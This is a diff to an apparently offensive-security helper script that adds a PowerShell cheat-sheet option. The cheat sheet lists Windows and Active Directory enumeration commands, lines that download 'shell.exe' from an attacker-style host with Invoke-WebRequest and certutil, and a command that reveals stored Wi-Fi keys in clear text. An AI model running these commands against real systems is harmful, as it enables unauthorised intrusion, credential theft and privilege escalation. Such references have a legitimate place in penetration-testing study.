@@ -51,6 +51,7 @@ reverseshell - Bash reverse shell
 sqlinjection - Sql injection codes
 encode - Base64 Encoder
 decode - Base64 Decoder
+powershellhandy - Powershell handy commands
 """)
 
 def subdomain():
@@ -285,6 +286,88 @@ while True:
         msgde = input("msg: ")
         decode(msgde)
         print(decode(msgde))
+    elif i == "powershellhandy":
+        print("""
+        System enumeration
+
+        systeminfo
+        Get-WmiObject Win32_ComputerSystem
+        echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+        # List Security patches
+        Get-Hotfix -description "Security update"
+        wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
+        # Environment Variables
+        Get-ChildItem Env: | ft Key,Value
+        (over cmd.exe)
+        set
+
+        HTTP download (wget like)
+
+        Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
+        # Cmd compatible
+        certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
+
+        WLAN enumeration
+
+        netsh wlan show profiles
+        netsh wlan show profile name="PROFILE-NAME" key=clear
+
+        Active Directory enumeration
+
+        Domain enumeration
+        Get-NetDomain
+        # List Forest Domains
+        Get-NetForestDomain
+        # Domain SID
+        Get-DomainSID 
+        # Domain Policy
+        Get-DomainPolicy
+        # Domain Organizational Units
+        Get-NetOU
+        # List trusted Domains
+        Get-NetDomainTrust
+
+        GPO enumeration
+
+        # GPO applied to the machine
+        Get-NetGPO -ComputerName computername.domain.com
+
+        Password enumeration
+
+        # Last Password Set date
+        Get-UserProperty –Properties pwdlastset
+        # Description of User object
+        Find-UserField -SearchField Description –SearchTerm “pass”
+        Computer enumeration
+        # List Computers of the Domain
+
+        Get-NetComputer
+
+        # List Pingable Hosts
+        Get-NetComputer -Ping
+        # List Windows 7 Ultimate Computers
+        Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
+
+        Admin groups and account enumeration
+
+        # List Domain Admin members
+        Get-NetGroupMember -GroupName "Domain Admins"
+        # List Admin Groups
+        Get-NetGroup *admin*
+        # List Local Admins [need Administrative rights]
+        Get-NetLocalGroup –ComputerName PCNAME-001
+        # Get groups of user [need Administrative rights]
+        Get-NetGroup –UserName "username"
+
+        ACL enumeration
+
+        # User ACL
+        Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
+        # GPO modifications rights
+        Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+        # Password reset rights
+        Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
+        """)
 
 
 
